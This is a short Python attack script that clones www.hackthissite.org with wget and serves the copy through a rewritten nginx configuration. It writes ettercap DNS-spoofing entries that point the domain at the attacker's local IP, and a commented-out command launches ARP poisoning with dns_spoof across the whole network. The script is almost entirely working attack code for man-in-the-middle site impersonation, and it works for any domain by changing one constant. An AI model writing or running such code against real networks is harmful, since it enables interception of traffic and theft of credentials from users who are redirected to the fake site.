import os
import socket

SITE = "www.hackthissite.org"

def nginx_config():
	path = "/etc/nginx/nginx.conf"
	with open(path, 'r') as file:
		text = file.readlines()
	location = 0
	for i in range(len(text)):
		if 'location /' in text[i].strip() and '#' not in text[i]:
			location = i + 1
	broken_path = (text[location].split()[1][:-1]).split("/")
	broken_path[len(broken_path)-2] = SITE
	text[location] = "\t\t\t" + " ".join(text[location].split()[:-1]) + " " + "/".join(broken_path) + ";\n"
	with open(path, 'w') as file:
		file.writelines(text)
	return 0

def ip_addr():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	addr = s.getsockname()[0]
	s.close
	return addr

def ettercap_dns():
	path = "/etc/ettercap/etter.dns"
	ip = ip_addr()
	text = [SITE[4:] + " A " + ip, "\n", "*" + SITE[3:] + " A " + ip, "\n", SITE + " PTR " + ip]
	with open(path, 'w') as file:
                file.writelines(text)
	return 0

def main():
	os.system("rm -r www.*")
	os.system("wget --level=1 --recursive --page-requisites --no-parent --convert-links --adjust-extension --no-clobber -e robots=off " + SITE)
	nginx_config()
	os.system("systemctl restart nginx")
	ettercap_dns()
	#os.system("ettercap -T -q -M arp -P dns_spoof /// ///")
	return 0

if __name__ == '__main__':
	main()
